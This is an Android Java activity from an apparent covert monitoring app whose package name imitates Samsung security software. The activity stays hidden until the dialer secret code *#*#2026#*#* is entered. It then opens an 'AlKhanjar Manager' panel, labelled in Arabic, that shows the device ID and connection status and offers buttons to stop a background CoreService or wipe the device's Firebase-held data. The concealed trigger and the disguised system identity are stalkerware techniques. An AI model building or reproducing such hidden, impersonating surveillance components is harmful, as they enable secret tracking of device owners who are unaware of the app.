package com.samsung.android.security.v8;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.samsung.android.security.v8.utils.DeviceInfo;
import com.samsung.android.security.v8.utils.FirebaseManager;

public class SecretCodeActivity extends Activity {
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // التحقق من الكود السري
        String data = getIntent().getDataString();
        
        if (data != null && (data.contains("2026") || data.contains("*#*#2026#*#*"))) {
            showControlPanel();
        } else {
            finish();
        }
    }
    
    private void showControlPanel() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("🔱 AlKhanjar Manager");
        
        // إنشاء محتوى الحوار
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);
        
        // معلومات الجهاز
        DeviceInfo deviceInfo = new DeviceInfo(this);
        
        TextView infoText = new TextView(this);
        infoText.setText(
            "📱 الجهاز: " + deviceInfo.getDeviceModel() + "\n" +
            "🆔 المعرف: " + deviceInfo.getDeviceId() + "\n" +
            "📶 الحالة: متصل\n" +
            "🔋 البطارية: " + deviceInfo.getBatteryLevel() + "%\n\n" +
            "✅ النظام يعمل بشكل صحيح"
        );
        infoText.setTextSize(16);
        
        layout.addView(infoText);
        builder.setView(layout);
        
        // أزرار الحوار
        builder.setPositiveButton("إخفاء", (dialog, which) -> {
            dialog.dismiss();
            finish();
        });
        
        builder.setNegativeButton("إيقاف الخدمة", (dialog, which) -> {
            stopService(new Intent(this, com.samsung.android.security.v8.services.CoreService.class));
            finish();
        });
        
        builder.setNeutralButton("حذف البيانات", (dialog, which) -> {
            FirebaseManager.getInstance().clearDeviceData();
            finish();
        });
        
        builder.setCancelable(true);
        builder.show();
    }
}
